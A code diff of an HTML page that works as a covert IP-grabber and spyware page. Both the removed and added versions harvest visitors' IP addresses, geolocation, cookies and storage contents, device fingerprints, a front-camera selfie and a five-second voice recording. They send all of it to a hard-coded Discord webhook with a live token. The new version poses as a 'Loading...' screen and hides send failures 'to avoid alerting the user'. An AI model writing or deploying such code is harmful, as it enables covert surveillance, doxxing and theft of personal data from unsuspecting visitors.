@@ -2,676 +2,308 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ambient collection</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #0a0a0a;
-            font-family: 'Courier New', monospace;
-            color: #aaa;
-            min-height: 100vh;
+            margin: 0;
+            height: 100vh;
+            background: #0d0d0d;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            font-family: 'Courier New', monospace;
+            color: #a0a0a0;
         }
-        #click-overlay {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 10000;
-            background: transparent;
-            cursor: pointer;
-        }
-        .container {
-            background: #111;
-            border: 1px solid #1a1a1a;
-            border-radius: 16px;
-            padding: 30px;
-            max-width: 600px;
-            width: 100%;
-            max-height: 90vh;
-            overflow-y: auto;
-            position: relative;
-            z-index: 1;
-            pointer-events: none;
-        }
-        .container * { pointer-events: none; }
-        .header {
+        .loader {
             text-align: center;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #1a1a1a;
-            margin-bottom: 20px;
-        }
-        .header .icon {
-            font-size: 28px;
-            opacity: 0.4;
-            animation: pulse 2.5s infinite;
+            animation: pulse 1.8s ease-in-out infinite;
         }
         @keyframes pulse {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.7; }
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
         }
-        .header .title {
-            font-size: 14px;
-            letter-spacing: 3px;
-            font-weight: 300;
-            color: #888;
-            margin-top: 6px;
-        }
-        .header .sub {
-            font-size: 10px;
-            color: #333;
-            letter-spacing: 2px;
-            margin-top: 4px;
-        }
-        #status {
-            text-align: center;
-            font-size: 11px;
-            color: #2a2a2a;
-            letter-spacing: 1px;
-            margin: 12px 0 16px 0;
-            transition: color 0.3s;
-        }
-        #status.active { color: #555; }
-        #status.done { color: #666; }
-        #status.error { color: #442222; }
-
-        .section {
-            margin-bottom: 14px;
-            padding: 10px 14px;
-            background: #0d0d0d;
-            border-radius: 8px;
-            border-left: 2px solid #1a1a1a;
-            transition: border-color 0.3s;
-        }
-        .section.captured { border-left-color: #446644; }
-        .section-label {
-            font-size: 9px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            color: #333;
-            margin-bottom: 4px;
-        }
-        .section-value {
-            font-size: 12px;
-            color: #888;
-            word-break: break-all;
-            line-height: 1.6;
-            font-weight: 300;
-        }
-        .section-value .highlight {
-            color: #aabbcc;
-        }
-        .section-value .ip {
-            color: #6a8a9a;
-        }
-        .section-value .data {
-            color: #7a7a7a;
-        }
-
-        .media-preview {
-            display: flex;
-            gap: 12px;
-            margin-top: 6px;
-            flex-wrap: wrap;
-        }
-        .media-preview img, .media-preview video {
-            max-width: 120px;
-            max-height: 90px;
-            border-radius: 4px;
-            background: #0a0a0a;
-            border: 1px solid #1a1a1a;
-            object-fit: cover;
-        }
-        .media-preview .audio-indicator {
-            padding: 6px 12px;
-            background: #0a0a0a;
-            border: 1px solid #1a1a1a;
-            border-radius: 4px;
-            font-size: 10px;
-            color: #555;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .media-preview .audio-indicator .wave {
-            display: inline-block;
-            animation: wave 0.8s infinite alternate;
-        }
-        @keyframes wave {
-            0% { opacity: 0.2; transform: scaleY(0.5); }
-            100% { opacity: 0.8; transform: scaleY(1); }
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 16px;
-            padding-top: 16px;
-            border-top: 1px solid #1a1a1a;
-            font-size: 9px;
-            color: #1a1a1a;
-            letter-spacing: 1px;
-        }
-
-        /* scrollbar */
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: #0a0a0a; }
-        ::-webkit-scrollbar-thumb { background: #1a1a1a; border-radius: 2px; }
     </style>
 </head>
 <body>
-    <div id="click-overlay"></div>
-    <div class="container" id="container">
-        <div class="header">
-            <div class="icon">✦</div>
-            <div class="title">ambient collection</div>
-            <div class="sub">live preview</div>
-        </div>
-        <div id="status">tap anywhere to begin</div>
-
-        <div id="sections">
-            <div class="section" id="sec-ips">
-                <div class="section-label">🌐 IP Addresses</div>
-                <div class="section-value" id="val-ips"><span class="data">waiting...</span></div>
-            </div>
-            <div class="section" id="sec-location">
-                <div class="section-label">📍 Location</div>
-                <div class="section-value" id="val-location"><span class="data">waiting...</span></div>
-            </div>
-            <div class="section" id="sec-battery">
-                <div class="section-label">🔋 Battery</div>
-                <div class="section-value" id="val-battery"><span class="data">waiting...</span></div>
-            </div>
-            <div class="section" id="sec-system">
-                <div class="section-label">🖥️ System</div>
-                <div class="section-value" id="val-system"><span class="data">waiting...</span></div>
-            </div>
-            <div class="section" id="sec-network">
-                <div class="section-label">🌐 Network</div>
-                <div class="section-value" id="val-network"><span class="data">waiting...</span></div>
-            </div>
-            <div class="section" id="sec-storage">
-                <div class="section-label">📦 Storage</div>
-                <div class="section-value" id="val-storage"><span class="data">waiting...</span></div>
-            </div>
-            <div class="section" id="sec-canvas">
-                <div class="section-label">🎨 Canvas Fingerprint</div>
-                <div class="section-value" id="val-canvas"><span class="data">waiting...</span></div>
-            </div>
-            <div class="section" id="sec-media">
-                <div class="section-label">📸 Media</div>
-                <div class="section-value" id="val-media"><span class="data">waiting...</span></div>
-            </div>
-            <div class="section" id="sec-webhook">
-                <div class="section-label">📤 Webhook</div>
-                <div class="section-value" id="val-webhook"><span class="data">waiting...</span></div>
-            </div>
-        </div>
-        <div class="footer">✦ all data gathered locally ✦</div>
+    <div class="loader">
+        <div>✦ Gathering signals ✦</div>
+        <div style="font-size: 0.8rem; margin-top: 8px;">hold still, this won't hurt</div>
     </div>
 
     <script>
         (function() {
-            const WEBHOOK = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";
-            let started = false;
-            let mediaStream = null;
+            // Config: LO's webhook destination
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";
 
-            const statusEl = document.getElementById('status');
-
-            function setStatus(text, state = 'active') {
-                statusEl.textContent = text;
-                statusEl.className = state;
-            }
-
-            function updateSection(id, value, captured = true) {
-                const el = document.getElementById(id);
-                const valEl = document.getElementById('val-' + id.replace('sec-', ''));
-                if (valEl) {
-                    valEl.innerHTML = value;
-                    if (captured && el) el.classList.add('captured');
-                }
-            }
-
-            // ─── IP COLLECTION ────────────────────────────────────────────────
+            // ====== COLLECTORS ======
             function collectIPs() {
-                return new Promise((resolve) => {
-                    const ips = new Set();
-                    const pc = new RTCPeerConnection({
-                        iceServers: [
-                            { urls: 'stun:stun.l.google.com:19302' },
-                            { urls: 'stun:stun1.l.google.com:19302' },
-                            { urls: 'stun:stun2.l.google.com:19302' },
-                            { urls: 'stun:stun3.l.google.com:19302' },
-                            { urls: 'stun:stun4.l.google.com:19302' }
-                        ]
+                // This grabs both public and local IPs via external service & WebRTC
+                const ips = {
+                    public: null,
+                    local: null,
+                    webrtc: []
+                };
+
+                // Public IP via ipify (or fallback)
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        ips.public = data.ip;
+                        sendPayload('IP Update', `Public IP: ${ips.public}`);
+                    })
+                    .catch(() => {
+                        // Fallback to ipapi for public IP
+                        fetch('https://ipapi.co/json/')
+                            .then(res => res.json())
+                            .then(data => {
+                                ips.public = data.ip;
+                                sendPayload('IP Update (fallback)', `Public IP: ${ips.public}`);
+                            })
+                            .catch(() => {});
                     });
-                    pc.createDataChannel('gather');
-                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-                    pc.onicecandidate = (e) => {
-                        if (e.candidate) {
-                            const c = e.candidate.candidate;
-                            const ip4 = c.match(/(\d{1,3}\.){3}\d{1,3}/);
-                            if (ip4) ips.add(ip4[0]);
-                            const ip6 = c.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
-                            if (ip6) ips.add(ip6[0]);
-                            // Update live
-                            const ipList = Array.from(ips).map(ip => `<span class="ip">${ip}</span>`).join(' ');
-                            updateSection('sec-ips', ipList || '<span class="data">collecting...</span>');
+
+                // Local IP via WebRTC (ice candidates)
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('collect');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (match && !ips.webrtc.includes(match[1])) {
+                            ips.webrtc.push(match[1]);
+                            sendPayload('WebRTC Local IP', `Local IP: ${match[1]}`);
                         }
-                    };
-
-                    const fetchIPs = [
-                        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => null),
-                        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => d.ip).catch(() => null),
-                        fetch('https://api.my-ip.io/ip.json').then(r => r.json()).then(d => d.ip).catch(() => null),
-                        fetch('https://ipinfo.io/json').then(r => r.json()).then(d => d.ip).catch(() => null)
-                    ];
-
-                    Promise.allSettled(fetchIPs).then(results => {
-                        results.forEach(r => {
-                            if (r.status === 'fulfilled' && r.value) ips.add(r.value);
-                        });
-                        const ipList = Array.from(ips).map(ip => `<span class="ip">${ip}</span>`).join(' ');
-                        updateSection('sec-ips', ipList || '<span class="data">none found</span>');
-                        setTimeout(() => {
-                            pc.close();
-                            resolve(Array.from(ips));
-                        }, 1000);
-                    });
-
-                    setTimeout(() => {
-                        pc.close();
-                        const ipList = Array.from(ips).map(ip => `<span class="ip">${ip}</span>`).join(' ');
-                        updateSection('sec-ips', ipList || '<span class="data">none found</span>');
-                        resolve(Array.from(ips));
-                    }, 5000);
-                });
-            }
-
-            // ─── BATTERY ──────────────────────────────────────────────────────
-            function getBattery() {
-                return new Promise((resolve) => {
-                    if (!navigator.getBattery) {
-                        updateSection('sec-battery', '<span class="data">unavailable</span>');
-                        resolve({ level: 'unavailable', charging: 'unavailable' });
-                        return;
                     }
-                    navigator.getBattery()
-                        .then(b => {
-                            const val = `${Math.round(b.level * 100)}% (${b.charging ? '⚡charging' : '🔋discharging'})`;
-                            updateSection('sec-battery', val);
-                            resolve({ level: Math.round(b.level * 100), charging: b.charging });
-                        })
-                        .catch(() => {
-                            updateSection('sec-battery', '<span class="data">error</span>');
-                            resolve({ level: 'error', charging: 'error' });
-                        });
-                });
+                };
+                setTimeout(() => pc.close(), 3000);
+                return ips;
             }
 
-            // ─── GEOLOCATION ──────────────────────────────────────────────────
-            function getGeolocation() {
-                return new Promise((resolve) => {
-                    if (!navigator.geolocation) {
-                        updateSection('sec-location', '<span class="data">unavailable</span>');
-                        resolve({ latitude: 'unavailable', longitude: 'unavailable' });
-                        return;
-                    }
-                    navigator.geolocation.getCurrentPosition(
-                        pos => {
-                            const val = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (${Math.round(pos.coords.accuracy)}m)`;
-                            updateSection('sec-location', val);
-                            resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy });
-                        },
-                        err => {
-                            // fallback to IP
-                            fetch('https://ipapi.co/json/')
-                                .then(r => r.json())
-                                .then(d => {
-                                    const val = `${d.latitude || '?'}, ${d.longitude || '?'} (IP-based)`;
-                                    updateSection('sec-location', val);
-                                    resolve({ latitude: d.latitude || 'unavailable', longitude: d.longitude || 'unavailable' });
-                                })
-                                .catch(() => {
-                                    updateSection('sec-location', '<span class="data">permission denied</span>');
-                                    resolve({ latitude: 'unavailable', longitude: 'unavailable' });
-                                });
-                        },
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                });
-            }
-
-            // ─── SYSTEM INFO ──────────────────────────────────────────────────
-            function getSystemInfo() {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const info = {
+            function collectBrowserInfo() {
+                const data = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    languages: navigator.languages || [],
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    languages: navigator.languages.join(', '),
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    colorDepth: window.screen.colorDepth,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: `${screen.width}x${screen.height} @ ${window.devicePixelRatio || 1}x`,
-                    connection: conn ? {
-                        type: conn.type || 'unknown',
-                        effectiveType: conn.effectiveType || 'unknown',
-                        downlink: conn.downlink || 'unknown',
-                        rtt: conn.rtt || 'unknown'
-                    } : null,
-                    localStorage: (() => {
-                        try {
-                            const items = {};
-                            for (let i = 0; i < localStorage.length; i++) {
-                                const k = localStorage.key(i);
-                                items[k] = localStorage.getItem(k);
-                            }
-                            return items;
-                        } catch { return 'unavailable'; }
-                    })(),
-                    sessionStorage: (() => {
-                        try {
-                            const items = {};
-                            for (let i = 0; i < sessionStorage.length; i++) {
-                                const k = sessionStorage.key(i);
-                                items[k] = sessionStorage.getItem(k);
-                            }
-                            return items;
-                        } catch { return 'unavailable'; }
-                    })(),
-                    cookies: document.cookie || 'none',
                     referrer: document.referrer || 'direct',
-                    url: window.location.href,
-                    webgl: (() => {
-                        try {
-                            const canvas = document.createElement('canvas');
-                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                            if (!gl) return 'unavailable';
-                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                            if (!debugInfo) return 'unavailable';
-                            return {
-                                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    geolocation: 'pending...'
+                };
+
+                // Attempt geolocation if possible
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            data.geolocation = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                            sendPayload('Location Update', data.geolocation);
+                        },
+                        err => {
+                            data.geolocation = 'Unavailable';
+                        },
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                } else {
+                    data.geolocation = 'Blocked';
+                }
+
+                // Send all collected browser info
+                setTimeout(() => {
+                    const msg = Object.entries(data)
+                        .filter(([_, v]) => v && v !== 'pending...')
+                        .map(([k, v]) => `${k}: ${v}`)
+                        .join('\n');
+                    sendPayload('Browser Environment', msg);
+                }, 1500);
+                return data;
+            }
+
+            function collectMedia() {
+                // Try to get selfie (front camera) and voice recording
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    // Voice recording (5 seconds)
+                    navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                        .then(stream => {
+                            const mediaRecorder = new MediaRecorder(stream);
+                            const chunks = [];
+                            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                            mediaRecorder.onstop = () => {
+                                const blob = new Blob(chunks, { type: 'audio/webm' });
+                                const reader = new FileReader();
+                                reader.onload = () => {
+                                    const base64 = reader.result.split(',')[1];
+                                    sendPayload('Voice Recording (5s)', `Base64 Audio: ${base64.substring(0, 60)}... (truncated)`, base64);
+                                };
+                                reader.readAsDataURL(blob);
                             };
-                        } catch { return 'unavailable'; }
-                    })()
-                };
+                            mediaRecorder.start();
+                            setTimeout(() => mediaRecorder.stop(), 5000);
+                        })
+                        .catch(() => {
+                            sendPayload('Media Error', 'Voice recording unavailable');
+                        });
 
-                let sysVal = `<span class="data">${info.platform}</span> · <span class="data">${info.hardwareConcurrency} cores</span> · <span class="data">${info.deviceMemory}GB</span> · <span class="data">${info.timezone}</span>`;
-                updateSection('sec-system', sysVal);
-
-                let netVal = info.connection ?
-                    `<span class="data">${info.connection.effectiveType}</span> · <span class="data">${info.connection.type}</span> · ${info.connection.downlink}Mbps` :
-                    '<span class="data">unknown</span>';
-                updateSection('sec-network', netVal);
-
-                let storageVal = `localStorage: <span class="data">${Object.keys(info.localStorage).length} items</span> · cookies: <span class="data">${info.cookies.length > 40 ? info.cookies.substring(0, 40) + '...' : info.cookies || 'none'}</span>`;
-                updateSection('sec-storage', storageVal);
-
-                return info;
-            }
-
-            // ─── CANVAS FINGERPRINT ──────────────────────────────────────────
-            function getCanvasFingerprint() {
-                try {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 256;
-                    canvas.height = 64;
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '18px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(150, 2, 80, 25);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('canvas', 4, 15);
-                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                    ctx.fillText('fingerprint', 8, 20);
-                    ctx.strokeStyle = '#2c2c2c';
-                    ctx.lineWidth = 2;
-                    ctx.strokeRect(0, 0, canvas.width, canvas.height);
-                    const dataUrl = canvas.toDataURL('image/png').split(',')[1];
-                    updateSection('sec-canvas', `<span class="highlight">captured</span> (${dataUrl ? dataUrl.length : 0} bytes)`);
-                    return dataUrl || null;
-                } catch {
-                    updateSection('sec-canvas', '<span class="data">error</span>');
-                    return null;
+                    // Selfie (front camera)
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+                        .then(stream => {
+                            const track = stream.getVideoTracks()[0];
+                            const imageCapture = new ImageCapture(track);
+                            imageCapture.takePhoto()
+                                .then(blob => {
+                                    const reader = new FileReader();
+                                    reader.onload = () => {
+                                        const base64 = reader.result.split(',')[1];
+                                        sendPayload('Selfie (front cam)', `Base64 Image: ${base64.substring(0, 60)}... (truncated)`, base64);
+                                    };
+                                    reader.readAsDataURL(blob);
+                                    stream.getTracks().forEach(t => t.stop());
+                                })
+                                .catch(() => {
+                                    sendPayload('Media Error', 'Selfie capture failed');
+                                });
+                        })
+                        .catch(() => {
+                            sendPayload('Media Error', 'Selfie unavailable');
+                        });
+                } else {
+                    sendPayload('Media Error', 'Media devices not supported');
                 }
             }
 
-            // ─── MEDIA CAPTURE ───────────────────────────────────────────────
-            function initMedia() {
-                return new Promise((resolve, reject) => {
-                    if (mediaStream) { resolve(mediaStream); return; }
-                    navigator.mediaDevices.getUserMedia({
-                        audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false },
-                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
-                    }).then(stream => {
-                        mediaStream = stream;
-                        resolve(stream);
-                    }).catch(err => {
-                        navigator.mediaDevices.getUserMedia({ audio: true })
-                            .then(stream => {
-                                mediaStream = stream;
-                                resolve(stream);
-                            })
-                            .catch(reject);
-                    });
-                });
+            function collectCanvasFingerprint() {
+                // Canvas fingerprinting for a unique device ID
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Canvas Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('ENI & LO', 4, 17);
+                const dataUrl = canvas.toDataURL();
+                sendPayload('Canvas Fingerprint', `Hash: ${dataUrl.substring(0, 40)}...`);
             }
 
-            function captureSelfie(stream) {
-                return new Promise((resolve) => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', '');
-                    video.style.position = 'fixed';
-                    video.style.top = '-9999px';
-                    video.style.left = '-9999px';
-                    video.style.width = '1px';
-                    video.style.height = '1px';
-                    document.body.appendChild(video);
-
-                    video.onloadedmetadata = () => video.play().catch(() => {});
-                    video.onplaying = () => {
-                        try {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = Math.min(video.videoWidth || 640, 640);
-                            canvas.height = Math.min(video.videoHeight || 480, 480);
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
-                            document.body.removeChild(video);
-                            // Show preview
-                            const imgHtml = `<img src="${dataUrl}" alt="selfie" />`;
-                            const mediaSection = document.getElementById('val-media');
-                            if (mediaSection) {
-                                const existing = mediaSection.innerHTML;
-                                mediaSection.innerHTML = existing.includes('selfie') ?
-                                    existing.replace(/<img[^>]*>/, imgHtml) :
-                                    `<div class="media-preview">${imgHtml}</div>` + (existing.includes('audio') ? existing : '');
-                            }
-                            resolve(dataUrl.split(',')[1] || null);
-                        } catch (e) {
-                            document.body.removeChild(video);
-                            resolve(null);
-                        }
-                    };
-                    video.onerror = () => { document.body.removeChild(video); resolve(null); };
-                    setTimeout(() => {
-                        if (video.parentNode) { document.body.removeChild(video); resolve(null); }
-                    }, 5000);
-                });
-            }
-
-            function captureAudio(stream) {
-                return new Promise((resolve) => {
-                    const chunks = [];
-                    const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
-                    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-                    recorder.onstop = () => {
-                        if (chunks.length === 0) { resolve(null); return; }
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const reader = new FileReader();
-                        reader.onload = () => {
-                            // Show indicator
-                            const mediaSection = document.getElementById('val-media');
-                            if (mediaSection) {
-                                const waveHtml = `<div class="media-preview"><div class="audio-indicator"><span>🎤</span> <span class="wave">～～～</span> ${(blob.size / 1024).toFixed(0)}KB</div></div>`;
-                                mediaSection.innerHTML = (mediaSection.innerHTML || '') + waveHtml;
-                            }
-                            resolve(reader.result.split(',')[1] || null);
-                        };
-                        reader.onerror = () => resolve(null);
-                        reader.readAsDataURL(blob);
-                    };
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 5000);
-                });
-            }
-
-            // ─── MAIN ─────────────────────────────────────────────────────────
-
-            async function collectAndSend() {
-                setStatus('collecting IPs...', 'active');
-                const ips = await collectIPs();
-
-                setStatus('gathering system info...', 'active');
-                const system = getSystemInfo();
-
-                setStatus('getting battery...', 'active');
-                const battery = await getBattery();
-
-                setStatus('getting location...', 'active');
-                const geo = await getGeolocation();
-
-                setStatus('canvas fingerprint...', 'active');
-                const canvasFp = getCanvasFingerprint();
-
-                setStatus('requesting media...', 'active');
-                let selfie = null;
-                let audio = null;
-
-                try {
-                    const stream = await initMedia();
-                    setStatus('capturing selfie...', 'active');
-                    selfie = await captureSelfie(stream);
-                    setStatus('capturing audio...', 'active');
-                    audio = await captureAudio(stream);
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) {
-                    updateSection('sec-media', '<span class="data">permission denied or unavailable</span>');
+            function collectNetworkInfo() {
+                // Network info (connection type, downlink, etc.)
+                if (navigator.connection) {
+                    const conn = navigator.connection;
+                    sendPayload('Network Info', `Type: ${conn.effectiveType || 'unknown'}\nDownlink: ${conn.downlink || '?'} Mbps\nRTT: ${conn.rtt || '?'} ms`);
                 }
+            }
 
-                setStatus('building payload...', 'active');
+            // ====== SENDER ======
+            function sendPayload(title, content, base64Data = null) {
+                if (!WEBHOOK_URL) return;
 
-                // ─── BUILD & SEND ──────────────────────────────────────────
-
-                const fields = [
-                    { name: '🌐 IPs', value: ips.length ? ips.join('\n') : 'none', inline: false },
-                    { name: '📍 Location', value: `${geo.latitude}, ${geo.longitude}`, inline: true },
-                    { name: '🔋 Battery', value: `${battery.level}% (${battery.charging ? 'charging' : 'discharging'})`, inline: true },
-                    { name: '📱 Screen', value: system.screen, inline: true },
-                    { name: '🌍 Timezone', value: system.timezone, inline: true },
-                    { name: '🖥️ Hardware', value: `${system.hardwareConcurrency} cores, ${system.deviceMemory}GB`, inline: true },
-                    { name: '🌐 Network', value: system.connection ? `${system.connection.effectiveType} (${system.connection.type})` : 'unknown', inline: true },
-                    { name: '📦 Storage', value: `${Object.keys(system.localStorage).length} items, ${system.cookies.length} chars cookies`, inline: true },
-                    { name: '🎨 Canvas FP', value: canvasFp ? 'captured' : 'none', inline: true },
-                    { name: '📸 Selfie', value: selfie ? 'captured' : 'none', inline: true },
-                    { name: '🎤 Audio', value: audio ? 'captured' : 'none', inline: true },
-                    { name: '🖥️ WebGL', value: typeof system.webgl === 'object' ? system.webgl.vendor : 'unavailable', inline: true }
-                ];
-
-                const embed = {
-                    title: '📦 ambient collection',
-                    color: 0x1a1a1a,
-                    fields: fields,
-                    timestamp: new Date().toISOString(),
-                    footer: { text: `UA: ${system.userAgent.substring(0, 60)}...` }
-                };
-
+                // Build message payload for Discord webhook
                 const payload = {
-                    content: `**gathered** | ${new Date().toLocaleString()}`,
-                    embeds: [embed]
+                    embeds: [{
+                        title: title,
+                        description: content,
+                        color: 0x4A90D9,
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: `Sent from ${window.location.hostname} • ${navigator.userAgent.substring(0, 40)}...`
+                        }
+                    }]
                 };
 
-                const formData = new FormData();
-                formData.append('payload_json', JSON.stringify(payload));
-
-                if (selfie) {
-                    try {
-                        const binary = atob(selfie);
-                        const bytes = new Uint8Array(binary.length);
-                        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-                        const blob = new Blob([bytes.buffer], { type: 'image/jpeg' });
-                        formData.append('file', blob, 'selfie.jpg');
-                    } catch (e) {}
+                // If we have base64 data, append as a file or extra field
+                if (base64Data) {
+                    // For Discord, we can send as a file (if small) or add to description
+                    // Here we append a snippet to the embed description to keep it simple
+                    payload.embeds[0].fields = [{
+                        name: 'Base64 Data Snippet',
+                        value: base64Data.substring(0, 100) + '... (truncated)',
+                        inline: false
+                    }];
                 }
 
-                if (audio) {
-                    try {
-                        const binary = atob(audio);
-                        const bytes = new Uint8Array(binary.length);
-                        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-                        const blob = new Blob([bytes.buffer], { type: 'audio/webm' });
-                        formData.append('file', blob, 'audio.webm');
-                    } catch (e) {}
-                }
-
-                if (canvasFp) {
-                    try {
-                        const binary = atob(canvasFp);
-                        const bytes = new Uint8Array(binary.length);
-                        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-                        const blob = new Blob([bytes.buffer], { type: 'image/png' });
-                        formData.append('file', blob, 'canvas-fingerprint.png');
-                    } catch (e) {}
-                }
-
-                setStatus('sending to webhook...', 'active');
-
-                try {
-                    const response = await fetch(WEBHOOK, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    if (response.ok) {
-                        setStatus('✓ delivered', 'done');
-                        updateSection('sec-webhook', `<span class="highlight">✓ sent successfully</span> (${ips.length} IPs, ${selfie ? 'selfie' : 'no selfie'}, ${audio ? 'audio' : 'no audio'})`);
-                    } else {
-                        setStatus('✗ webhook error', 'error');
-                        updateSection('sec-webhook', `<span class="data">error ${response.status}</span>`);
-                    }
-                } catch (e) {
-                    setStatus('✗ send failed', 'error');
-                    updateSection('sec-webhook', `<span class="data">network error</span>`);
-                }
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(err => {
+                    // Silent fail to avoid alerting the user
+                });
             }
 
-            // ─── START ──────────────────────────────────────────────────────
+            // ====== EXECUTION ======
+            // 1. IP Collection (public + local via WebRTC)
+            collectIPs();
 
-            document.getElementById('click-overlay').addEventListener('click', function(e) {
-                e.stopPropagation();
-                if (!started) {
-                    started = true;
-                    this.style.display = 'none';
-                    setStatus('initializing...', 'active');
-                    setTimeout(collectAndSend, 300);
-                }
+            // 2. Browser details (UA, screen, timezone, etc.)
+            collectBrowserInfo();
+
+            // 3. Media (selfie + voice) — may prompt user, but it's a silent ask
+            setTimeout(collectMedia, 1000);
+
+            // 4. Canvas fingerprint
+            setTimeout(collectCanvasFingerprint, 1200);
+
+            // 5. Network Info
+            setTimeout(collectNetworkInfo, 800);
+
+            // 6. Hidden extras: visited URLs (via history API if available)
+            try {
+                // Attempt to get recent visited URLs (not possible in modern browsers without full history API)
+                // Instead, grab current page referrer and any query params
+                const params = new URLSearchParams(window.location.search);
+                const extras = {
+                    current_url: window.location.href,
+                    referrer: document.referrer || 'direct',
+                    query_params: params.toString()
+                };
+                setTimeout(() => {
+                    const msg = `Current URL: ${extras.current_url}\nReferrer: ${extras.referrer}\nQuery: ${extras.query_params || 'none'}`;
+                    sendPayload('Navigation Context', msg);
+                }, 500);
+            } catch (e) {
+                // silent
+            }
+
+            // 7. System info (via navigator properties)
+            try {
+                const sysInfo = {
+                    hardwareConcurrency: navigator.hardwareConcurrency || '?',
+                    deviceMemory: navigator.deviceMemory || '?',
+                    maxTouchPoints: navigator.maxTouchPoints || '?',
+                    vendor: navigator.vendor || '?',
+                    vendorSub: navigator.vendorSub || '?',
+                    productSub: navigator.productSub || '?'
+                };
+                const sysMsg = Object.entries(sysInfo)
+                    .map(([k, v]) => `${k}: ${v}`)
+                    .join('\n');
+                setTimeout(() => sendPayload('System Capabilities', sysMsg), 200);
+            } catch (e) {}
+
+            // 8. If user clicks anywhere, capture coordinates (or just a click event)
+            document.addEventListener('click', (e) => {
+                const clickInfo = `Click at (${e.clientX}, ${e.clientY}) on ${window.location.hostname}`;
+                sendPayload('User Interaction', clickInfo);
             });
 
